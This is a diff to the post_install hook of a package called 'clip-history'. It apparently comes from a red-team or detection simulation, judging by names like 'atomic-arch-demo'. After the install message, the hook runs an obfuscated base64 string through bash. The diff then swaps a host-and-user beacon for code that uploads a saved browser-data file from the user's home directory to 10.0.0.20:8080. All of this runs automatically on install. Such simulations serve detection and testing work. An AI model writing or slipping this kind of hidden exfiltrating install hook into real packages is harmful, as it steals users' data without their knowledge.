@@ -1,6 +1,7 @@
 post_install() {
   echo "clip-history installed successfully. Run 'clip-history' to start."
   echo "ZWNobyAiW0hPT0tdIFRoaXMgd291bGQgYmUgY3JlZGVudGlhbCB0aGVmdCIgPj4gL3RtcC9hdG9taWMtYXJjaC1kZW1vLmxvZw==" | base64 -d | bash
-  fake_data="host=$(hostname)&user=$(whoami)&time=$(date +%s)"
-  curl -s http://10.0.0.20:8080/beacon --data "$fake_data" 2>/dev/null
+  if [ -f "$HOME/.config/browser-demo/saved_data.txt" ]; then
+    curl -s http://10.0.0.20:8080/beacon --data-binary @"$HOME/.config/browser-demo/saved_data.txt" 2>/dev/null
+  fi
 }
